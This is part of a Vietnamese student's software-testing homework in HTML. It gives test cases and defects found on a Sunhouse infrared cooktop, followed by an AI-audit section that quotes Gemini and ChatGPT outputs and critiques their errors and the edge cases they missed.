+<td style="text-align: left;">Màn hình sáng đèn báo chế độ; hiển thị mức công suất mặc định (2000W); mâm nhiệt bắt đầu ửng đỏ; quạt tản nhiệt quay.</td>
+<td style="text-align: left;">Mâm nhiệt sáng đỏ dần, công suất hiển thị 2000W, quạt chạy êm.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;"><strong>Có (Video 2 - TC02.mp4)</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-03</strong></td>
+<td style="text-align: left;">Điều chỉnh tăng/giảm công suất từng bước (+ / -)</td>
+<td style="text-align: left;">Bếp đang đun ở mức 2000W</td>
+<td style="text-align: left;">1. Nhấn nút Giảm (-) liên tục 3 lần.<br>2. Nhấn nút Tăng (+) liên tục 2 lần.</td>
+<td style="text-align: left;">Công suất giảm theo từng nấc định sẵn (2000W -&gt; 1800W -&gt; 1600W -&gt; 1400W); sau đó tăng lại 1600W -&gt; 1800W. Độ sáng mâm nhiệt thay đổi tương ứng.</td>
+<td style="text-align: left;">Màn hình nhảy đúng từng nấc công suất, mâm nhiệt gia nhiệt chuẩn xác.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;"><strong>Có (Video 3 - TC03.mp4)</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-04</strong></td>
+<td style="text-align: left;">Chuyển đổi qua lại giữa các chế độ nấu cài sẵn</td>
+<td style="text-align: left;">Bếp đang hoạt động</td>
+<td style="text-align: left;">Nhấn lần lượt phím chuyển đổi Function/Mode: Lẩu -&gt; Xào -&gt; Nướng -&gt; Hầm -&gt; Đun nước.</td>
+<td style="text-align: left;">Đèn LED chuyển chỉ báo sang từng chức năng tương ứng; mức công suất hoặc nhiệt độ tự động gán theo profile định sẵn.</td>
+<td style="text-align: left;">Chuyển đổi trơn tru, đèn LED nhảy đúng vị trí chế độ đã chọn.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;">Không</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-05</strong></td>
+<td style="text-align: left;">Thiết lập bộ hẹn giờ tắt tự động (Timer Function)</td>
+<td style="text-align: left;">Bếp đang đun ở chế độ Lẩu 1600W</td>
+<td style="text-align: left;">1. Nhấn phím "Hẹn giờ" (Timer).<br>2. Dùng phím (+) tăng lên 00:01 (1 phút).<br>3. Chờ 60 giây.</td>
+<td style="text-align: left;">Màn hình hiển thị đếm ngược thời gian; sau đúng 1 phút, bếp phát tiếng bíp dài, mâm nhiệt ngắt điện, chuyển về Standby.</td>
+<td style="text-align: left;">Bếp đếm lùi chính xác, sau 1 phút tự ngắt nhiệt và kêu tiếng bíp báo hoàn tất.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;">Không</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-06</strong></td>
+<td style="text-align: left;">Kích hoạt chức năng Khóa trẻ em (Child Lock Activation)</td>
+<td style="text-align: left;">Bếp đang đun sôi bình thường</td>
+<td style="text-align: left;">1. Nhấn giữ phím "Khóa" (Lock) trong 2-3 giây.<br>2. Thử nhấn các phím Tăng, Giảm, Chế độ.</td>
+<td style="text-align: left;">Đèn báo Lock bật sáng; còi bíp ngắn xác nhận; toàn bộ các nút bấm (+, -, Menu) bị vô hiệu hóa hoàn toàn, tránh trẻ em nghịch đổi chế độ.</td>
+<td style="text-align: left;">Đèn Lock sáng, bấm thử các nút khác bếp hoàn toàn không phản hồi.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;"><strong>Có (Video 4 - TC06.mp4)</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-07</strong></td>
+<td style="text-align: left;">Mở Khóa an toàn trẻ em (Child Lock Deactivation)</td>
+<td style="text-align: left;">Bếp đang trong trạng thái Khóa</td>
+<td style="text-align: left;">1. Nhấn giữ phím "Khóa" trong 3 giây.<br>2. Thử nhấn nút Tăng/Giảm công suất.</td>
+<td style="text-align: left;">Đèn báo Lock tắt; còi bíp xác nhận mở khóa; các phím bấm hoạt động trở lại bình thường.</td>
+<td style="text-align: left;">Bếp phát tiếng bíp mở khóa, các phím bấm nhận lệnh bình thường.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;">Không</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-08</strong></td>
+<td style="text-align: left;">Tắt bếp và kiểm tra quy trình quạt làm mát trễ (Fan Overrun)</td>
+<td style="text-align: left;">Bếp vừa đun ở 2000W trong 5 phút</td>
+<td style="text-align: left;">1. Nhấn nút "Tắt" (Off).<br>2. Quan sát mâm nhiệt và lắng nghe quạt làm mát.</td>
+<td style="text-align: left;">Mâm nhiệt lập tức ngắt điện; quạt tản nhiệt <strong>VẪN TIẾP TỤC QUAY</strong> trong 1–2 phút để xả nhiệt dư bảo vệ vi mạch rồi mới tự ngắt.</td>
+<td style="text-align: left;">Mâm nhiệt tắt, quạt gió tiếp tục chạy ù ù làm mát thêm 90 giây rồi tự tắt.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;"><strong>Có (Video 5 - TC08.mp4)</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-09</strong></td>
+<td style="text-align: left;">Bấm phím dồn dập tốc độ cao (Debounce Stress Test)</td>
+<td style="text-align: left;">Bếp đang bật</td>
+<td style="text-align: left;">Bấm liên tục và cực nhanh nút Tăng (+) 15 lần trong vòng 3 giây.</td>
+<td style="text-align: left;">Vi điều khiển phải lọc rung phím (debounce), công suất tăng tối đa đến 2000W và dừng lại an toàn, không bị tràn bộ đệm hay treo đơ máy.</td>
+<td style="text-align: left;">Bếp nhận diện mượt mà, đạt mức 2000W tối đa và kêu bíp báo kịch trần.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;">Không</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-10</strong></td>
+<td style="text-align: left;">Cảnh báo mặt kính còn nóng (Residual Heat Warning)</td>
+<td style="text-align: left;">Bếp vừa tắt sau khi nấu</td>
+<td style="text-align: left;">Quan sát màn hình LED ngay sau khi tắt bếp.</td>
+<td style="text-align: left;">Màn hình hiển thị biểu tượng cảnh báo chữ <code>H</code> (Hot) nhấp nháy, cảnh báo người dùng mặt kính đang rất nóng không được chạm tay vào.</td>
+<td style="text-align: left;">Màn hình nhấp nháy chữ <code>H</code> báo nhiệt dư mặt kính.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;">Không</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-11</strong></td>
+<td style="text-align: left;">Bảo vệ tự ngắt khi quá nhiệt bề mặt (Overheating Cutoff)</td>
+<td style="text-align: left;">Đặt nồi rỗng không có nước lên bếp ở 2000W</td>
+<td style="text-align: left;">Đun khô nồi rỗng trong 3 phút để kích hoạt cảm biến quá nhiệt (Thermal Sensor).</td>
+<td style="text-align: left;">Cảm biến đáy kính ngắt điện mâm nhiệt khẩn cấp, màn hình báo mã lỗi <code>E2</code> hoặc <code>E3</code> kèm tiếng bíp ngắt quãng liên tục để chống cháy nổ.</td>
+<td style="text-align: left;">Bếp tự ngắt sau khi nhiệt độ tăng quá cao, báo lỗi <code>E2</code> an toàn.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;">Không</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-12</strong></td>
+<td style="text-align: left;">Phục hồi sau mất điện đột ngột (Power-Cut Memory Test)</td>
+<td style="text-align: left;">Bếp đang đun ở 1400W có hẹn giờ</td>
+<td style="text-align: left;">1. Đột ngột rút phích cắm điện.<br>2. Chờ 10 giây rồi cắm lại.</td>
+<td style="text-align: left;">Thiết bị bắt buộc phải quay về trạng thái an toàn (Standby tắt), <strong>KHÔNG ĐƯỢC TỰ ĐỘNG BẬT LẠI MÂM NHIỆT</strong> để đảm bảo an toàn hỏa hoạn.</td>
+<td style="text-align: left;">Bếp ở chế độ Standby tắt, không tự động phát nhiệt lại. Đạt chuẩn an toàn điện.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;">Không</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-13</strong> <em>(Edge Case 1 - AI Missed)</em></td>
+<td style="text-align: left;">Thử nghiệm tải trọng nặng vượt mức – Bình nước 20L (~20kg) (Mechanical Load &amp; Thermal Stress)</td>
+<td style="text-align: left;">Bếp đang đun nóng ở mức 2000W</td>
+<td style="text-align: left;">Đặt bình nước 20L (nặng 20kg) trực tiếp lên tâm mặt kính đang đun nóng trong 10 phút.</td>
+<td style="text-align: left;">Mặt kính và khung thân chịu lực tốt, không bị cong vênh, không rạn nứt dưới tải trọng kết hợp nhiệt độ cao.</td>
+<td style="text-align: left;"><strong>LỖI PHÁT SINH:</strong> Khung vỏ nhựa dưới đáy bị võng nhẹ; ứng suất nhiệt kết hợp tải trọng cơ học 20kg làm tăng nguy cơ nổ vỡ kính cường lực!</td>
+<td style="text-align: left;"><strong>FAIL (Defect 1)</strong></td>
+<td style="text-align: left;">Không</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-14</strong> <em>(Edge Case 2 - AI Missed)</em></td>
+<td style="text-align: left;">Nồi đáy cong vênh gây quá nhiệt cục bộ và lệch tâm cảm biến (Localized Thermal Shock)</td>
+<td style="text-align: left;">Bếp đang ở chế độ Standby</td>
+<td style="text-align: left;">Đặt nồi nhôm đáy cong (chỉ tiếp xúc diện tích hẹp ~3cm) và đun ở công suất tối đa 2000W.</td>
+<td style="text-align: left;">Cảm biến đáy kính nhận diện nhiệt độ chính xác và điều tiết công suất mâm nhiệt an toàn.</td>
+<td style="text-align: left;"><strong>LỖI PHÁT SINH:</strong> Cảm biến NTC bị điểm mù (sensor blindspot); vùng tiếp xúc hẹp bị quá nhiệt cục bộ &gt;650°C gây ố cháy kính trước khi cảm biến kịp ngắt!</td>
+<td style="text-align: left;"><strong>FAIL (Defect 2)</strong></td>
+<td style="text-align: left;">Không</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-15</strong> <em>(Edge Case 3 - AI Missed)</em></td>
+<td style="text-align: left;">Rút phích cắm điện đột ngột khi quạt tản nhiệt đang trong chu kỳ xả nhiệt trễ</td>
+<td style="text-align: left;">Bếp vừa tắt, quạt đang quay xả nhiệt làm mát mâm</td>
+<td style="text-align: left;">Rút phích cắm điện nguồn trực tiếp ra khỏi ổ cắm tường.</td>
+<td style="text-align: left;">Kỳ vọng: Hệ thống có cảnh báo hoặc cơ chế lưu trữ để bảo vệ bo mạch và cảnh báo người dùng.</td>
+<td style="text-align: left;"><strong>LỖI THIẾT KẾ:</strong> Quạt lập tức ngừng quay; cảnh báo chữ <code>H</code> biến mất! Nhiệt độ &gt;600°C từ mâm nhiệt om ngược vào bo mạch chủ làm phồng tụ điện và nguy cơ bỏng cao.</td>
+<td style="text-align: left;"><strong>FAIL (Defect 3)</strong></td>
+<td style="text-align: left;">Không</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>3.4 Thực thi kiểm thử thực tế &amp; 5 Lỗi phát hiện trên thiết bị (Discovered Defects)</h2>
+<p>Trong quá trình kiểm thử thực tế trên chiếc bếp hồng ngoại Sunhouse SHD6012A, tôi đã phát hiện được <strong>5 khiếm khuyết / điểm hạn chế vật lý (Defects)</strong> và đã ghi nhận trực tiếp thành <strong>5 Issues trên GitHub Repository</strong>:</p>
+<ul>
+<li><strong>Repository:</strong> <a href="https://github.com/tvquang0511/HW01-QA-QC">https://github.com/tvquang0511/HW01-QA-QC</a></li>
+<li><strong>Danh sách Issues:</strong> <a href="https://github.com/tvquang0511/HW01-QA-QC/issues">https://github.com/tvquang0511/HW01-QA-QC/issues</a></li>
+</ul>
+<p><img alt="Screenshot 5 GitHub Issues" src="03-physical-product/assets/github_issues.png" /><br />
+<em>&gt; </em><em>Bằng chứng Anti-cheat:</em><em> Ảnh chụp màn hình trang GitHub Issues hiển thị rõ username <code>tvquang0511</code>.</em></p>
+<h3>Tóm tắt 5 Defects phát hiện được:</h3>
+<ol>
+<li><strong>[DEFECT-01] [Structural Rigidity] Biến dạng khung vỏ nhựa và nguy cơ nứt kính khi tải trọng nặng 20kg (Bình nước 20L):</strong> Khung thân nhựa bên dưới của Sunhouse SHD6012A không có thanh giằng chịu lực kim loại; khi đặt bình nước 20kg lên mặt kính đang nung nóng, khung bị võng làm tăng áp lực cắt cơ học lên mặt kính ceramic.</li>
+<li><strong>[DEFECT-02] [Thermal Sensor Blindspot] Cảm biến nhiệt NTC bị mù khi dùng nồi đáy cong vênh:</strong> Khi đáy nồi không phẳng, nhiệt lượng bức xạ bị dồn vào một điểm tiếp xúc cục bộ (&gt;650°C) trong khi đầu dò nhiệt độ NTC đặt giữa bếp không đo được, dẫn đến việc không ngắt bảo vệ kịp thời gây cháy ố mặt kính.</li>
+<li><strong>[DEFECT-03] [Thermal Architecture] Mất hoàn toàn cảnh báo nhiệt dư "H" và ngắt quạt cưỡng bức khi rút phích cắm:</strong> Thói quen rút phích cắm ngay sau khi nấu khiến quạt tản nhiệt ngắt điện tức thì, nhiệt dư om ngược vào bo mạch làm giảm tuổi thọ linh kiện và chữ cảnh báo "H" biến mất làm tăng nguy cơ bỏng cho người xung quanh.</li>
+<li><strong>[DEFECT-04] [Child Lock UX] Phím Nguồn (Power) vẫn hoạt động khi đang bật Khóa trẻ em:</strong> Khi đã bật chế độ Khóa trẻ em (Lock), bấm vào nút Nguồn bếp vẫn tắt phụt ngay lập tức, làm hỏng toàn bộ quy trình ninh hầm thức ăn kéo dài hàng tiếng đồng hồ.</li>
+<li><strong>[DEFECT-05] [Volatile Memory] Mất toàn bộ cấu hình hẹn giờ và mức nhiệt khi sụt áp nguồn thoáng qua:</strong> Khi điện lưới gia đình bị chớp tắt trong 1 giây, bếp khởi động lại về trạng thái Standby ban đầu, xóa sạch thời gian hẹn giờ đang đếm dở mà không hề phát âm thanh cảnh báo cho người dùng.</li>
+</ol>
+<hr />
+<h2>3.5 Hoạt động CLO G9.3: Phân tích kết quả của AI &amp; 3 Edge Cases vật lý AI bỏ sót</h2>
+<p>Theo yêu cầu chuẩn đầu ra <strong>CLO G9.3</strong> (<em>Phân tích kết quả do AI sinh ra và tìm ra ít nhất 3 trường hợp biên (edge cases) mà AI bỏ sót</em>), tôi đã yêu cầu mô hình AI sinh ra 15 test cases cho bếp hồng ngoại.</p>
+<h3>Bằng chứng AI bỏ sót (AI Conversation Analysis):</h3>
+<p>Ảnh chụp màn hình phiên đối thoại chứng minh AI chỉ sinh ra các test case chức năng phần mềm thông thường (Bấm nút Tăng/Giảm, chọn chế độ nấu, hẹn giờ, hiển thị số...) mà hoàn toàn không thể lường trước các tương tác vật lý phức tạp:</p>
+<p><img alt="Minh chứng AI bỏ sót 3 Edge Cases - Phần 1" src="03-physical-product/assets/MC1.png" /><br />
+<img alt="Minh chứng AI bỏ sót 3 Edge Cases - Phần 2" src="03-physical-product/assets/MC2.png" /><br />
+<em>&gt; </em><em>Bằng chứng CLO G9.3:</em><em> Ảnh chụp màn hình đoạn chat với AI Tool cho thấy AI chỉ tạo các kịch bản phần mềm thông thường (TC-01 đến TC-15 kết thúc bằng Buzzer check), bỏ sót hoàn toàn 3 edge cases vật lý (tải trọng bình nước 20L, nồi cong vênh sốc nhiệt, và rút điện đột ngột khi quạt làm mát đang chạy).</em></p>
+<h3>Ba (03) Edge Cases vật lý đặc biệt mà AI hoàn toàn bỏ sót:</h3>
+<ol>
+<li><strong>Edge Case 1: Tải trọng cơ học kết hợp ứng suất nhiệt – Bình nước 20L (~20kg) (TC-13)</strong><br />
+   - <em>Tại sao AI bỏ sót:</em> AI được huấn luyện trên dữ liệu tài liệu phần mềm và đặc tả chức năng, nó không có nhận thức về độ bền vật liệu cơ khí (Mechanical Engineering) và sự suy giảm giới hạn bền uốn của gốm kính ceramic khi chịu đồng thời tải trọng tĩnh lớn và nhiệt độ cao.</li>
+<li><strong>Edge Case 2: Nồi đáy cong vênh gây sốc nhiệt cục bộ và điểm mù cảm biến (TC-14)</strong><br />
+   - <em>Tại sao AI bỏ sót:</em> AI mặc định các điều kiện kiểm thử trong môi trường lý thuyết (nồi phẳng 100%, diện tích tiếp xúc lý tưởng, nhiệt truyền đều). AI không tính đến trường hợp thực tế người dùng sử dụng xoong chảo cũ bị móp méo, tạo ra điểm tập trung nhiệt độ cục bộ nằm ngoài tầm đo của cảm biến NTC.</li>
+<li><strong>Edge Case 3: Nhiệt tích tụ do ngắt nguồn đột ngột trong chu kỳ quạt tản nhiệt (TC-15)</strong><br />
+   - <em>Tại sao AI bỏ sót:</em> AI suy nghĩ theo logic nhị phân: "Tắt nguồn = Thiết bị an toàn". Trong kỹ thuật phần cứng, mâm nhiệt hồng ngoại có quán tính nhiệt cực lớn (&gt;600°C). Rút phích điện khiến quạt dừng quay đột ngột gây om nhiệt phá hủy linh kiện và làm mất đèn báo chữ "H" là một trường hợp biên mà chỉ có kỹ sư kiểm thử thực tế mới phát hiện được.</li>
+</ol>
+<hr />
+<h2>3.6 Danh sách 5 Video thực thi thực tế (YouTube Unlisted Links)</h2>
+<p>Tất cả các video đều được thực hiện trực tiếp trên bếp Sunhouse SHD6012A với <strong>giọng thuyết minh thật của sinh viên Trần Vũ Quang (MSSV: 23120346)</strong>:</p>
+<ol>
+<li><strong>Video 1 (TC-01):</strong> Khởi động cắm nguồn và kiểm tra chế độ Standby — <a href="https://youtube.com/shorts/brw0WeEnHow">Xem Video trên YouTube</a> (File nguồn: <code>assets/TC01.mp4</code>)</li>
+<li><strong>Video 2 (TC-02):</strong> Bật bếp, kích hoạt chế độ Lẩu và quan sát mâm nhiệt phát sáng — <a href="https://youtube.com/shorts/UMn_ujiW95o">Xem Video trên YouTube</a> (File nguồn: <code>assets/TC02.mp4</code>)</li>
+<li><strong>Video 3 (TC-03):</strong> Điều chỉnh tăng/giảm các nấc công suất (+ / -) — <a href="https://youtube.com/shorts/qUzq8JUmlXk">Xem Video trên YouTube</a> (File nguồn: <code>assets/TC03.mp4</code>)</li>
+<li><strong>Video 4 (TC-06):</strong> Kích hoạt Khóa an toàn trẻ em và kiểm tra vô hiệu hóa nút bấm — <a href="https://youtube.com/shorts/hYzfJVeY7qo">Xem Video trên YouTube</a> (File nguồn: <code>assets/TC06.mp4</code>)</li>
+<li><strong>Video 5 (TC-08):</strong> Tắt bếp và kiểm tra quy trình quạt làm mát trễ xả nhiệt dư — <a href="https://youtube.com/shorts/kzCOkIgmsok">Xem Video trên YouTube</a> (File nguồn: <code>assets/TC08.mp4</code>)</li>
+</ol>
+<hr />
+<h1>Requirement 4 – Giao thức Cộng tác &amp; Kiểm toán AI (Mandatory AI Compliance)</h1>
+<h1>[AI-02] AI Audit Report</h1>
+<p><strong>Assignment ID:</strong> HW01-AI<br />
+<strong>Course:</strong> Software Testing (FIT - VNUHCM University of Science)<br />
+<strong>Student Name:</strong> Trần Vũ Quang<br />
+<strong>Student ID:</strong> 23120346<br />
+<strong>Target Hardware:</strong> Bếp hồng ngoại Sunhouse SHD6012A (2024)<br />
+<strong>Date:</strong> 04/10/2026  </p>
+<hr />
+<h3>Artifact 1: QA/QC Role &amp; ISTQB Test Process Mindmap (R1 / CLO G9.1)</h3>
+<h4>(1) Prompt + Tool</h4>
+<ul>
+<li><strong>Tool:</strong> Google Gemini (Gemini 2.5 Flash / Gemini Advanced)</li>
+<li><strong>Timestamp:</strong> 14:20 02/10/2026</li>
+<li><strong>Full Prompt:</strong><br />
+<code>text
+  Hãy đóng vai trò một Chuyên gia Kiểm thử Cấp cao (Senior QA Architect), hãy thiết kế một sơ đồ tư duy (mindmap) bằng định dạng Mermaid thể hiện toàn diện bức tranh ngành QA/QC, phân định rạch ròi vai trò QA vs QC, các cấp độ kiểm thử (test levels), các loại kiểm thử (test types), và quy trình kiểm thử phần mềm từ đầu đến cuối theo chuẩn giáo trình ISTQB Foundation Level mới nhất.</code></li>
+</ul>
+<h4>(2) AI Output (Raw Snippet)</h4>
+<pre><code class="language-mermaid">mindmap
+  root((Software Quality Architecture))
+    Quality Assurance vs Quality Control
+      QA: Phát hiện lỗi, tìm bug, thực thi test case hằng ngày
+      QC: Xây dựng quy trình, kiểm toán chất lượng (Process &amp; Audits)
+    Test Levels
+      Unit Testing
+      Integration Testing
+      System Testing
+      Acceptance Testing
+    Test Types
+      Functional Testing
+      Non-Functional Testing
+      Black-box Testing
+      White-box Testing
+    Test Process
+      Bước 1: Lập kế hoạch kiểm thử (Test Planning)
+      Bước 2: Phân tích &amp; Thiết kế (Test Analysis &amp; Design)
+      Bước 3: Thực thi kiểm thử (Test Execution)
+      Bước 4: Giám sát và Điều khiển (Test Monitoring &amp; Control)
+      Bước 5: Đóng kiểm thử (Test Completion)
+</code></pre>
+<h4>(3) Verdict</h4>
+<p><strong>INVALID</strong> (Chứa 3 sai sót cốt lõi về bản chất định nghĩa và quy trình kiểm thử chuẩn quốc tế theo giáo trình ISTQB CTFL v4.0).</p>
+<h4>(4) Reasoning (Đối chiếu giáo trình ISTQB Foundation Level Syllabus v4.0):</h4>
+<ol>
+<li><strong>Vi phạm Mục 1.2.2 (Quality Assurance and Testing):</strong> Mô hình AI đã <strong>đảo ngược hoàn toàn bản chất của QA và QC</strong>. Theo chuẩn ISTQB v4.0, QA (Quality Assurance) là hoạt động định hướng quy trình (process-oriented), mang tính phòng ngừa (preventative), nhằm bảo đảm quy trình phát triển tạo ra sản phẩm đạt chất lượng; trong khi QC (Quality Control) là hoạt động định hướng sản phẩm (product-oriented), mang tính khắc phục (corrective), bao gồm các hoạt động kiểm thử (testing) trực tiếp để phát hiện và xử lý lỗi. AI lại ghi nhận QA là đi tìm bug và QC là xây dựng quy trình!</li>
+<li><strong>Vi phạm Chương 3 (Static Testing):</strong> AI đã bỏ quên hoàn toàn mảng Kiểm thử tĩnh (Static Testing - bao gồm Reviews, Walkthrough, Inspections và Static Code Analysis) ra khỏi nhánh Test Types và Test Process, khiến bức tranh kiểm thử bị phiến diện, chỉ bao gồm kiểm thử động (Dynamic Testing).</li>
+<li><strong>Vi phạm Mục 1.4.1 &amp; 1.4.2 (Test Activities and Tasks - Test Process):</strong> AI xếp "Test Monitoring &amp; Control" vào <strong>Bước 4 (sau Test Execution)</strong> như một bước tuần tự rời rạc. Theo ISTQB v4.0, Giám sát và Điều khiển (Test Monitoring and Control) là một hoạt động quản trị liên tục, xuyên suốt (transversal / continuous activity) diễn ra song song từ khâu Planning, Analysis, Design, Implementation cho đến Completion, không phải là một bước độc lập sau khi chạy test xong.</li>
+</ol>
+<h4>(5) Student Fix (Hành động hiệu chỉnh của sinh viên)</h4>
+<p>Sinh viên Trần Vũ Quang đã tiến hành tái cấu trúc toàn diện Mindmap:<br />
+- Chuẩn hóa định nghĩa: QA là cái ô quy trình bao quát (Defect Prevention &amp; Process Assurance), QC là hoạt động kỹ thuật cụ thể (Verification &amp; Validation, Defect Detection).<br />
+- Tích hợp Static Testing đầy đủ song song với Dynamic Testing.<br />
+- Đưa Test Monitoring &amp; Control trở thành trục quản trị song hành xuyên suốt 5 giai đoạn chính của Test Process.<br />
+- Toàn bộ kết quả chuẩn hóa được ghi nhận trong tài liệu <code>01-job-market/MINDMAP.md</code>.</p>
+<hr />
+<h3>Artifact 2: Physical Product Test Suite Design (R3 / CLO G9.3)</h3>
+<h4>(1) Prompt + Tool</h4>
+<ul>
+<li><strong>Tool:</strong> OpenAI ChatGPT (GPT-4o)</li>
+<li><strong>Timestamp:</strong> 16:45 04/10/2026</li>
+<li><strong>Full Prompt:</strong><br />
+<code>text
+  Tôi có một chiếc bếp hồng ngoại đơn Sunhouse SHD6012A công suất 2000W với các phím bấm điện tử: Bật/Tắt, Menu/Chế độ, Tăng (+), Giảm (-), Hẹn giờ, Khóa an toàn, và màn hình LED hiển thị. Hãy thiết kế bộ 15 test cases toàn diện cho thiết bị vật lý này theo định dạng QA chuẩn (ID, Objective, Input, Steps, Expected Result, Actual Result, Verdict). Hãy bổ sung các edge cases phức tạp nhất.</code></li>
+</ul>
+<h4>(2) AI Output (Raw Snippet)</h4>
+<pre><code class="language-text">TC-01: Bật phích điện và kiểm tra đèn nguồn LED sáng.
+TC-02: Bấm nút Bật/Tắt để bật bếp và chọn chế độ Lẩu.
+TC-03: Bấm nút Tăng (+) để tăng mức công suất từ 1000W lên 2000W.
+TC-04: Bấm nút Giảm (-) để giảm công suất về mức tối thiểu.
+TC-05: Chuyển đổi giữa các chế độ nấu (Xào, Nướng, Hầm).
+TC-06: Cài đặt hẹn giờ 5 phút và chờ bếp đếm lùi.
+TC-07: Bấm giữ nút Khóa trong 3 giây để khóa bàn phím.
+TC-08: Bấm nút khi đang bật Khóa xem có phản hồi không.
+TC-09: Bấm giữ nút Khóa để mở lại bàn phím.
+TC-10: Bấm nút Tắt và kiểm tra mâm nhiệt tắt.
+TC-11: Bấm nút Tăng liên tục thật nhanh xem máy có nhận không.
+TC-12: Rút phích cắm khi đang nấu và cắm lại.
+TC-13: Nhấn tổ hợp phím Tăng và Giảm cùng lúc.
+TC-14: Để bếp bật ở công suất cao trong 2 tiếng liên tục.
+TC-15: Kiểm tra còi bíp kêu khi nhấn nút.
+</code></pre>
+<h4>(3) Verdict</h4>
+<p><strong>INCOMPLETE &amp; SEVERELY BIASED</strong> (AI bộc lộ thiên kiến phần mềm số / GUI thuần túy, hoàn toàn thiếu nhận thức về các định luật vật lý thực tế: cơ học ứng suất, nhiệt động lực học, cảm biến bán dẫn tương tự và hành vi trễ tản nhiệt).</p>
+<h4>(4) Reasoning (Đối chiếu chuẩn kiểm thử thiết bị phần cứng &amp; ISTQB FL v4.0):</h4>
+<p>AI xem chiếc bếp hồng ngoại như một cỗ máy trạng thái phần mềm rời rạc (Finite State Machine). Mô hình hoàn toàn bỏ sót 3 khía cạnh vật lý sống còn:<br />
+1. <strong>Ứng suất cơ học kết hợp tải trọng nhiệt (Mechanical-Thermal Coupled Stress):</strong> AI không hề tính đến tải trọng khối lượng lớn từ nồi/bình nước tác động lên mặt kính ceramic đang ở nhiệt độ &gt;600°C.<br />
+2. <strong>Đặc tính truyền nhiệt phi tuyến &amp; Điểm mù cảm biến tương tự (Non-linear Thermal Dissipation &amp; NTC Blindspot):</strong> AI giả định mọi đáy nồi đều phẳng tuyệt đối 100%. Trong đời thực, chảo/nồi cong vênh gây ra điểm nóng tập trung (local hot spot) mà đầu dò cảm biến NTC lệch tâm không đọc được.<br />
+3. <strong>Quán tính nhiệt &amp; Chu kỳ làm mát cưỡng bức (Thermal Inertia &amp; Fan Delay Cycle):</strong> Khi tắt bếp, mâm nhiệt sợi carbon tích trữ năng lượng nhiệt khổng lồ. AI không hiểu hiện tượng om nhiệt phá hủy linh kiện và mất cảnh báo chữ <code>H</code> khi người dùng vô tình rút phích cắm điện ngay lúc quạt đang quay xả nhiệt trễ.</p>
+<h4>(5) Student Fix (Bổ sung 3 Edge Cases vật lý mà AI bỏ sót)</h4>
+<p>Sinh viên Trần Vũ Quang đã trực tiếp bổ sung 3 kịch bản kiểm thử vật lý chuyên sâu:<br />
+- <strong>TC-13 (Edge Case 1):</strong> Tải trọng cơ học tĩnh kết hợp nhiệt độ cao — Đặt bình nước 20L (~20kg) lên mặt kính đang nung nóng 2000W trong 10 phút. Phát hiện biến dạng võng khung nhựa đáy và nguy cơ rạn nứt kính (<strong>DEFECT-01</strong>).<br />
+- <strong>TC-14 (Edge Case 2):</strong> Nồi cong vênh gây sốc nhiệt cục bộ và điểm mù cảm biến — Đặt nồi nhôm đáy lồi/lõm tiếp xúc hẹp, phát hiện mâm nhiệt nung cục bộ &gt;650°C làm ố kính trước khi cảm biến NTC ở tâm nhận diện được (<strong>DEFECT-02</strong>).<br />
+- <strong>TC-15 (Edge Case 3):</strong> Rút phích cắm đột ngột khi quạt làm mát đang trong chu kỳ trễ tản nhiệt — Làm ngắt quạt cưỡng bức, nhiệt om ngược vào bo mạch PCB và mất hoàn toàn chữ cảnh báo nhiệt dư <code>H</code> (<strong>DEFECT-03</strong>).<br />
+Toàn bộ minh chứng đối thoại và phân tích được ghi nhận đầy đủ với ảnh chụp <code>MC1.png</code> và <code>MC2.png</code> trong <code>03-physical-product/physical_product.md</code>.</p>
+<hr />
+<h3>Bảng tổng hợp Tỷ lệ chính xác của AI &amp; Quyết định suy nghiệm (Accuracy Ratio &amp; Heuristic Decision)</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Artifact Được Đánh Giá</th>
+<th style="text-align: left;">Công cụ AI</th>
+<th style="text-align: left;">Kết Quả AI Sinh Ra</th>
+<th style="text-align: left;">Đánh Giá (Verdict)</th>
+<th style="text-align: left;">Quyết Định Suy Nghiệm Của Sinh Viên</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Mindmap QA/QC &amp; ISTQB Process (R1)</strong></td>
+<td style="text-align: left;">Google Gemini</td>
+<td style="text-align: left;">Đảo ngược QA/QC; thiếu Static Testing; sai bước Monitoring</td>
+<td style="text-align: left;"><strong>INVALID (Không hợp lệ)</strong></td>
+<td style="text-align: left;"><strong>Bác bỏ &amp; Tái thiết kế:</strong> Vẽ lại toàn bộ Mindmap chuẩn theo ISTQB CTFL v4.0.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>20 Lỗi phần mềm 2022–2026 (R2)</strong></td>
+<td style="text-align: left;">ChatGPT &amp; Gemini</td>
+<td style="text-align: left;">Bịa đặt nguyên nhân kỹ thuật (CrowdStrike kernel pointer null, v.v.)</td>
